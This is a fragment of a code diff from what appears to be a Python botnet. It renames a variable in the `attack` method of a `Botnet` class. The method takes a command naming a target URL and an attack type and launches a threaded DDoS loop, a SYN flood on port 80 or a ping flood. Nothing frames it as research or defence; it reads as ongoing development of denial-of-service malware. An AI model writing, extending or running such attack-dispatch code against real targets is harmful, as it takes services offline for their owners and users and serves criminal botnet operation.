@@ -122,16 +122,16 @@ class Botnet:
     def attack(self, cmd):
         try:
             url = cmd.split(" ")[-1]
-            type = cmd.split(" ")[-2]
+            attackType = cmd.split(" ")[-2]
         except:
             pass
 
-        if type == "$DDoS":
+        if attackType == "$DDoS":
             while self.stopAttbool is not True:
                 threading.Thread(target=self.distributed_denial_of_service_attack, args=[url]).start()
-        elif type == "$SynFlooding":
+        elif attackType == "$SynFlooding":
             self.syn_flooding(url, 80)
-        elif type == "$PingFlooding":
+        elif attackType == "$PingFlooding":
             self.ping_flooding(url)
 
     def distributed_denial_of_service_attack(self, url):
